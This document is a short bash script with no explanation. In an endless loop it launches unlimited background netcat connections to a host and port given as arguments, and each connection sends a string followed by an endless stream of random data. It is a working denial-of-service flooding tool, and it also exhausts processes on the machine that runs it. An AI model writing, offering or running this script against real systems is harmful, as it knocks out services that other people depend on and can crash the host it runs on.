#!/bin/bash

while [ 1 ]
do
      (echo -ne "$3\n" ; cat /dev/random) | nc $1 $2 &
done
      
